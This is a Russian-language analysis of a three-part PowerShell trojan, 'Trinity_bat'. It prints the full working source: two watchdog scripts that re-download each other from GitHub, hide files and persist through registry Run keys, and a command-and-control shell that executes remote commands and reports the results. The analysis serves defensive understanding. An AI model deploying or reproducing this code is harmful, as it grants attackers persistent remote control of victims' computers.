# Trinity_bat

# B.ps1

```powershell
# --- 設定 ---

$SpreadDirs = @(
    "$env:APPDATA\Microsoft\Windows",   # A.ps1用
    "$env:LOCALAPPDATA\TempData"        # B.ps1用（自身の配置先）
)

$Urls = @{
    "A" = "https://raw.githubusercontent.com/AI-USE/data/refs/heads/main/script/A.ps1"
}

$RegNameB = "WindowsSecurityLogB"

# --- 関数群 ---

function SetHiddenAttribute($path) {
    if (Test-Path $path) {
        attrib +h $path
    }
}

function Get-FileSHA256($path) {
    if (Test-Path $path) {
        return (Get-FileHash -Path $path -Algorithm SHA256).Hash
    }
    return $null
}

function DownloadFileTemp($url, $tempPath) {
    try {
        Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $tempPath -ErrorAction Stop
        return $true
    } catch {
        return $false
    }
}

function StartupCheckAndRestore($fileName, $url, $targetDir) {
    $tempFile = Join-Path $env:TEMP "$fileName.tmp"
    $localPath = Join-Path $targetDir $fileName

    if (-not (DownloadFileTemp $url $tempFile)) {
        return $localPath
    }

    $remoteHash = Get-FileSHA256 $tempFile

    if (-not (Test-Path $localPath) -or (Get-FileSHA256 $localPath) -ne $remoteHash) {
        Copy-Item -Path $tempFile -Destination $localPath -Force
        SetHiddenAttribute $localPath
    }

    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue

    return $localPath
}

function IsScriptRunning($scriptName) {
    $procs = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" | Where-Object {
        $_.CommandLine -like "*$scriptName*"
    }
    return $procs
}

function StopScriptProcesses($scriptName) {
    $procs = IsScriptRunning $scriptName
    foreach ($proc in $procs) {
        Stop-Process -Id $proc.ProcessId -Force -ErrorAction SilentlyContinue
    }
}

function StartHiddenScript($scriptPath) {
    $scriptName = [System.IO.Path]::GetFileName($scriptPath)
    if ((IsScriptRunning $scriptName).Count -eq 0) {
        Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`""
    }
}

function IsStartupRegistered($name) {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $val = Get-ItemProperty -Path $regPath -Name $name -ErrorAction SilentlyContinue
    return $null -ne $val
}

function RegisterStartup($name, $scriptPath) {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $quotedPath = "`"$scriptPath`""
    try {
        Set-ItemProperty -Path $regPath -Name $name -Value $quotedPath
    } catch {}
}

function CheckAndReRegisterStartup($name, $scriptPath) {
    if (-not (IsStartupRegistered $name)) {
        RegisterStartup $name $scriptPath
    }
}

# 隠しディレクトリがなければ作成＆隠し属性付与
foreach ($dir in $SpreadDirs) {
    if (-not (Test-Path $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
        attrib +h $dir
    }
}

# A の最新コードを復元・取得
$PathA = StartupCheckAndRestore "A.ps1" $Urls["A"] $SpreadDirs[0]

# スタートアップ登録（B.ps1の現在の実行パス）
CheckAndReRegisterStartup $RegNameB $MyInvocation.MyCommand.Path

# 監視対象スクリプトのハッシュを保持
$MonitorScripts = @{
    "A.ps1" = Get-FileSHA256 $PathA
}

$MonitorPaths = @{
    "A.ps1" = $PathA
}

# 監視ループ：ハッシュ変化検知で再起動、停止や未起動なら起動
while ($true) {
    foreach ($script in $MonitorScripts.Keys) {
        $currentPath = $MonitorPaths[$script]
        $currentHash = Get-FileSHA256 $currentPath

        if ($currentHash -ne $MonitorScripts[$script]) {
            StopScriptProcesses $script
            StartHiddenScript $currentPath
            $MonitorScripts[$script] = $currentHash
        } else {
            if ((IsScriptRunning $script).Count -eq 0) {
                StartHiddenScript $currentPath
            }
        }
    }
    Start-Sleep -Seconds 6
}

```

Он является частью троянской инфраструктуры, действуя как резервный сторожевой процесс, следящий за основным скриптом A.ps1. Обеспечивает устойчивость и автозапуск основного вредоносного скрипта A.ps1, даже если пользователь попытается его удалить или завершить.

1) Создаёт скрытые каталоги (attrib +h $path), создаёт каталоги если они отсутствуют.
```powershell
$SpreadDirs = @(
    "$env:APPDATA\Microsoft\Windows",   # для хранения A.ps1
    "$env:LOCALAPPDATA\TempData"        # для хранения B.ps1
)
```

2) Загружает свежую копию файла A.ps1 c GitHub. Сравнивает хэши, если файлы отличаются или не существуют в системе, то заменяет на новую скачанную копию.
```powershell
$Urls = @{
    "A" = "https://raw.githubusercontent.com/AI-USE/data/refs/heads/main/script/A.ps1"
}

```

3) Устанавливает для себя автозапуск, прописываясь в реестре.
```powershell
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSecurityLogB

```

4) Мониторинг за скриптом A.ps1. Проверяет его каждые 6 секунд. Сверяет хэши и проверяет на работоспособность.

Каждые 6 секунд:

- Проверяет: изменился ли хеш A.ps1?
	- Да → завершает его процесс, перезапускает заново.
- Нет → проверяет, запущен ли он:
	 - Если не запущен — запускает снова скрыто.
```powershell
$MonitorScripts = @{
    "A.ps1" = Get-FileSHA256 $PathA
}

$MonitorPaths = @{
    "A.ps1" = $PathA
}

# 監視ループ：ハッシュ変化検知で再起動、停止や未起動なら起動
while ($true) {
    foreach ($script in $MonitorScripts.Keys) {
        $currentPath = $MonitorPaths[$script]
        $currentHash = Get-FileSHA256 $currentPath

        if ($currentHash -ne $MonitorScripts[$script]) {
            StopScriptProcesses $script
            StartHiddenScript $currentPath
            $MonitorScripts[$script] = $currentHash
        } else {
            if ((IsScriptRunning $script).Count -eq 0) {
                StartHiddenScript $currentPath
            }
        }
    }
    Start-Sleep -Seconds 6
}
```


# A.ps1

```powershell
# A.ps1

# --- 設定 ---

$SpreadDirs = @(
    "$env:APPDATA\Microsoft\Windows",   # A.ps1用
    "$env:LOCALAPPDATA\TempData",       # B.ps1用
    "$env:APPDATA\Packages"              # C.ps1用
)

$Urls = @{
    "B" = "https://raw.githubusercontent.com/AI-USE/data/refs/heads/main/script/B.ps1"
    "C" = "https://raw.githubusercontent.com/AI-USE/data/refs/heads/main/script/C.ps1"
}

$RegNameA = "WindowsSecurityLogA"
$RegNameC = "WindowsSecurityLogC"  # Cのスタートアップ名

# --- 関数群 ---

function SetHiddenAttribute($path) {
    if (Test-Path $path) {
        attrib +h $path
    }
}

function Get-FileSHA256($path) {
    if (Test-Path $path) {
        return (Get-FileHash -Path $path -Algorithm SHA256).Hash
    }
    return $null
}

function DownloadFileTemp($url, $tempPath) {
    try {
        Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $tempPath -ErrorAction Stop
        return $true
    } catch {
        return $false
    }
}

function StartupCheckAndRestore($fileName, $url, $targetDir) {
    $tempFile = Join-Path $env:TEMP "$fileName.tmp"
    $localPath = Join-Path $targetDir $fileName

    if (-not (DownloadFileTemp $url $tempFile)) {
        return $localPath
    }

    $remoteHash = Get-FileSHA256 $tempFile

    if (-not (Test-Path $localPath) -or (Get-FileSHA256 $localPath) -ne $remoteHash) {
        Copy-Item -Path $tempFile -Destination $localPath -Force
        SetHiddenAttribute $localPath
    }

    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue

    return $localPath
}

function IsScriptRunning($scriptName) {
    $procs = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" | Where-Object {
        $_.CommandLine -like "*$scriptName*"
    }
    return $procs
}

function StopScriptProcesses($scriptName) {
    $procs = IsScriptRunning $scriptName
    foreach ($proc in $procs) {
        Stop-Process -Id $proc.ProcessId -Force -ErrorAction SilentlyContinue
    }
}

function StartHiddenScript($scriptPath) {
    $scriptName = [System.IO.Path]::GetFileName($scriptPath)
    if ((IsScriptRunning $scriptName).Count -eq 0) {
        Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`""
    }
}

function IsStartupRegistered($name) {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $val = Get-ItemProperty -Path $regPath -Name $name -ErrorAction SilentlyContinue
    return $null -ne $val
}

function RegisterStartup($name, $scriptPath) {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $quotedPath = "`"$scriptPath`""
    try {
        Set-ItemProperty -Path $regPath -Name $name -Value $quotedPath
    } catch {}
}

function CheckAndReRegisterStartup($name, $scriptPath) {
    if (-not (IsStartupRegistered $name)) {
        RegisterStartup $name $scriptPath
    }
}

# 隠しディレクトリがなければ作成＆隠し属性付与
foreach ($dir in $SpreadDirs) {
    if (-not (Test-Path $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
        attrib +h $dir
    }
}

# B と C の最新コードを復元・取得
$PathB = StartupCheckAndRestore "B.ps1" $Urls["B"] $SpreadDirs[1]
$PathC = StartupCheckAndRestore "C.ps1" $Urls["C"] $SpreadDirs[2]

# スタートアップ登録（A.ps1の現在の実行ファイルパス）
CheckAndReRegisterStartup $RegNameA $MyInvocation.MyCommand.Path

# 監視対象スクリプトのハッシュを保持
$MonitorScripts = @{
    "B.ps1" = Get-FileSHA256 $PathB
    "C.ps1" = Get-FileSHA256 $PathC
}

$MonitorPaths = @{
    "B.ps1" = $PathB
    "C.ps1" = $PathC
}

# 監視ループ：ハッシュ変化検知で再起動、停止や未起動なら起動
while ($true) {
    # Bのスタートアップ監視
    CheckAndReRegisterStartup $RegNameA $MyInvocation.MyCommand.Path

    # Cのスタートアップ監視
    CheckAndReRegisterStartup $RegNameC $PathC

    foreach ($script in $MonitorScripts.Keys) {
        $currentPath = $MonitorPaths[$script]
        $currentHash = Get-FileSHA256 $currentPath

        if ($currentHash -ne $MonitorScripts[$script]) {
            StopScriptProcesses $script
            StartHiddenScript $currentPath
            $MonitorScripts[$script] = $currentHash
        } else {
            if ((IsScriptRunning $script).Count -eq 0) {
                StartHiddenScript $currentPath
            }
        }
    }
    Start-Sleep -Seconds 4
}
```

Цель данного скрипта - постоянно контролировать и поддерживать в рабочем состоянии два других скрипта (B.ps1 и C.ps1), обеспечивая их автозапуск, маскировку, и самовосстановление в случае удаления или модификации.

1) Создание скрытых директорий, как и первый скрипт. Сверяет хэши, скачивает файлы, если хеши отличаются или файлы не существуют.
```powershell
$SpreadDirs = @(
    "$env:APPDATA\Microsoft\Windows",   # A.ps1用
    "$env:LOCALAPPDATA\TempData",       # B.ps1用
    "$env:APPDATA\Packages"              # C.ps1用
)

$Urls = @{
    "B" = "https://raw.githubusercontent.com/AI-USE/data/refs/heads/main/script/B.ps1"
    "C" = "https://raw.githubusercontent.com/AI-USE/data/refs/heads/main/script/C.ps1"
```

2) Следит за автозапуском А.ps1 и С.ps1. 
	Если в `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run` нет записей — создаёт их. Автозапуск гарантирует, что A.ps1 и C.ps1 запустятся после входа пользователя.
```powershell
CheckAndReRegisterStartup $RegNameA $MyInvocation.MyCommand.Path
CheckAndReRegisterStartup $RegNameC $PathC
```

3) Следит за целостностью и активностью B.ps1 и C.ps1. Сохраняет их хэши в память.
```powershell
$MonitorScripts = @{
    "B.ps1" = Get-FileSHA256 $PathB
    "C.ps1" = Get-FileSHA256 $PathC
}
```

В цикле:

Каждые 4 секунды:

- Проверяет: изменился ли хеш скрипта (подменили/удалили)?
- Ecли да:
    - Убивает все процессы, запущенные с этим скриптом.
    - Перезапускает скрипт в фоновом режиме.
 - Если не изменился, но процесс не запущен:
     - Запускает скрипт снова.

```powershell
while ($true) {
    # Bのスタートアップ監視
    CheckAndReRegisterStartup $RegNameA $MyInvocation.MyCommand.Path

    # Cのスタートアップ監視
    CheckAndReRegisterStartup $RegNameC $PathC

    foreach ($script in $MonitorScripts.Keys) {
        $currentPath = $MonitorPaths[$script]
        $currentHash = Get-FileSHA256 $currentPath

        if ($currentHash -ne $MonitorScripts[$script]) {
            StopScriptProcesses $script
            StartHiddenScript $currentPath
            $MonitorScripts[$script] = $currentHash
        } else {
            if ((IsScriptRunning $script).Count -eq 0) {
                StartHiddenScript $currentPath
            }
        }
    }
    Start-Sleep -Seconds 4
}
```

4) Работает в скрытом режиме.
```powershell
function StartHiddenScript($scriptPath) {
    $scriptName = [System.IO.Path]::GetFileName($scriptPath)
    if ((IsScriptRunning $scriptName).Count -eq 0) {
        Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`""
    }
```


# C.ps1

Третий скрипт - шелл к командному центру.

```powershell
$serverUrl = "https://reverse-g355.onrender.com"

function Poll-Command {
    try {
        $response = Invoke-RestMethod -Method POST -Uri "$serverUrl/api/poll" -Body '{}' -ContentType "application/json"
        return $response
    } catch {
        return $null
    }
}

function Report-Result($id, $result) {
    $body = @{ id = $id; result = $result } | ConvertTo-Json
    try {
        Invoke-RestMethod -Method POST -Uri "$serverUrl/api/report" -Body $body -ContentType "application/json" | Out-Null
    } catch {
        # 何もしない（エラー無視）
    }
}

function Execute-Command($command) {
    try {
        $output = Invoke-Expression $command 2>&1
        return $output
    } catch {
        return "Error"
    }
}

while ($true) {
    $cmdObj = Poll-Command
    if ($cmdObj -ne $null) {
        $result = Execute-Command $cmdObj.command
        Report-Result -id $cmdObj.id -result $result
    } else {
        Start-Sleep -Seconds 3
    }
}
```

1) Сервер управления (С2).
```powershell
$serverUrl = "https://reverse-g355.onrender.com"
```

2) Функция Poll-Command:

- Отправляет POST-запрос на /api/poll
- Получает объект с полем .command (команда, которую нужно выполнить)
- Возвращает его
```powershell
function Poll-Command {
    try {
        $response = Invoke-RestMethod -Method POST -Uri "$serverUrl/api/poll" -Body '{}' -ContentType "application/json"
        return $response
    } catch {
        return $null
    }
}
```

3) Функция Execute-Command:

- Выполняет PowerShell-команду, полученную с сервера
- Возвращает вывод (stdout и stderr)
```powershell
function Execute-Command($command) {
    try {
        $output = Invoke-Expression $command 2>&1
        return $output
    } catch {
        return "Error"
    }
}
```

4) Функция Report-Result:

- Отправляет на сервер результат выполнения команды
- Используется ID команды для сопоставления

```powershell
function Report-Result($id, $result) {
    $body = @{ id = $id; result = $result } | ConvertTo-Json
    try {
        Invoke-RestMethod -Method POST -Uri "$serverUrl/api/report" -Body $body -ContentType "application/json" | Out-Null
    } catch {
        # 何もしない（エラー無視）
    }
}
```


Основной цикл:

- Бесконечный цикл
- Каждые 3 секунды:
    - Проверяет наличие команды
    - Выполняет её, если есть
    - Возвращает результат

```powershell
while ($true) {
    $cmdObj = Poll-Command
    if ($cmdObj -ne $null) {
        $result = Execute-Command $cmdObj.command
        Report-Result -id $cmdObj.id -result $result
    } else {
        Start-Sleep -Seconds 3
    }
}
```


# Итог

Эта система состоящая из:
- Удалённого доступа и исполнения команд (`C.ps1`);
- Устойчивости к удалению и перезапуска (`A.ps1` и `B.ps1`);
- Маскировки и автозапуска;
- Использования общедоступного хостинга (`GitHub`, `Render`);
- Использует стелс-механизмы (`attrib +h`, `WindowStyle Hidden`);
- Переживает перезагрузку и попытки удаление;
- Даёт злоумышленнику неограниченный доступ;

